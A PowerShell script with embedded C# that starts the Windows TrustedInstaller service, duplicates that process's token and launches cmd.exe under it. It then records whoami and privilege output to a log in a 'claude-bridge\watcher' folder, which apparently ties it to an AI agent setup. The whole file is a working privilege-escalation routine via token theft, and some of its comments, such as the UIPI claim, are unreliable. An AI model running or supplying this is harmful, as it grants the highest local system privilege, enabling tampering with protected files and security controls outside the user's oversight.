# ti_elevate.ps1 — Get TrustedInstaller token and run a command
$dir = "C:\Users\wsx\Desktop\claude-bridge\watcher"
$log = Join-Path $dir "watcher.log"
$ts = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss.fff")

# Step 1: Start TrustedInstaller service and wait for process
"$ts | [TI] Starting TrustedInstaller service..." | Out-File $log -Append
sc start TrustedInstaller 2>$null
Start-Sleep 3

# Step 2: Find the process
$tiProc = Get-Process -Name "TrustedInstaller" -ErrorAction SilentlyContinue
if (-not $tiProc) {
    "$ts | [TI] TrustedInstaller process not found after start" | Out-File $log -Append
    exit 1
}
$tiPid = $tiProc.Id
"$ts | [TI] TrustedInstaller running PID=$tiPid" | Out-File $log -Append

# Step 3: Compile and run C# code that:
#   - Opens TI process with PROCESS_QUERY_LIMITED_INFORMATION
#   - Duplicates its token
#   - Creates a new PowerShell as TrustedInstaller
$csCode = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class TIBridge {
    [DllImport("kernel32")] static extern IntPtr OpenProcess(uint a, bool b, uint c);
    [DllImport("advapi32")] static extern bool OpenProcessToken(IntPtr h, uint a, out IntPtr t);
    [DllImport("advapi32")] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr n, uint l, uint tp, out IntPtr d);
    [DllImport("advapi32", CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr t, uint f, string a, string c, uint cf, IntPtr e, string d, ref SI si, out PI pi);
    [DllImport("kernel32")] static extern int GetLastError();

    struct SI { public uint cb; IntPtr a1; IntPtr a2; IntPtr a3; IntPtr a4; IntPtr a5; IntPtr a6; IntPtr a7; IntPtr a8; IntPtr a9; IntPtr a10; IntPtr a11; IntPtr a12; IntPtr a13; IntPtr a14; IntPtr a15; IntPtr a16; IntPtr a17; }
    struct PI { public IntPtr p; public IntPtr t; public uint pid; public uint tid; }

    public static void Run(int pid, string cmd) {
        // Use PROCESS_QUERY_LIMITED_INFORMATION (0x1000) to bypass UIPI
        IntPtr hProc = OpenProcess(0x1000, false, (uint)pid);
        if (hProc == IntPtr.Zero) { Console.Write("ERR:OPROC_" + GetLastError()); return; }

        IntPtr tiToken;
        if (!OpenProcessToken(hProc, 0x000F, out tiToken)) {  // TOKEN_DUPLICATE|TOKEN_QUERY|TOKEN_ASSIGN_PRIMARY|TOKEN_ADJUST_SESSIONID
            Console.Write("ERR:OPTKN_" + GetLastError()); return;
        }

        IntPtr dupToken;
        if (!DuplicateTokenEx(tiToken, 0x1FFFFF, IntPtr.Zero, 2, 1, out dupToken)) {
            Console.Write("ERR:DUP_" + GetLastError()); return;
        }

        SI si = new SI(); si.cb = (uint)Marshal.SizeOf(typeof(SI));
        PI pi;

        if (!CreateProcessWithTokenW(dupToken, 0, "cmd.exe", cmd, 0x10, IntPtr.Zero, null, ref si, out pi)) {
            Console.Write("ERR:CPROC_" + GetLastError()); return;
        }
        Console.Write("OK_PID=" + pi.pid);
    }
}
"@

try {
    $asm = Add-Type -TypeDefinition $csCode -Language CSharp -PassThru -ErrorAction Stop
    "$ts | [TI] C# compiled OK, calling Run($tiPid)..." | Out-File $log -Append

    $result = [TIBridge]::Run($tiPid, "/c whoami > C:\\Windows\\Temp\\TI_WHOAMI.txt & whoami /priv >> C:\\Windows\\Temp\\TI_WHOAMI.txt")
    "$ts | [TI] Result: $result" | Out-File $log -Append

    Start-Sleep 2
    if (Test-Path "C:\Windows\Temp\TI_WHOAMI.txt") {
        $content = Get-Content "C:\Windows\Temp\TI_WHOAMI.txt" -Raw
        "$ts | [TI] OUTPUT: $content" | Out-File $log -Append
    }
} catch {
    "$ts | [TI] ERROR: $_" | Out-File $log -Append
}
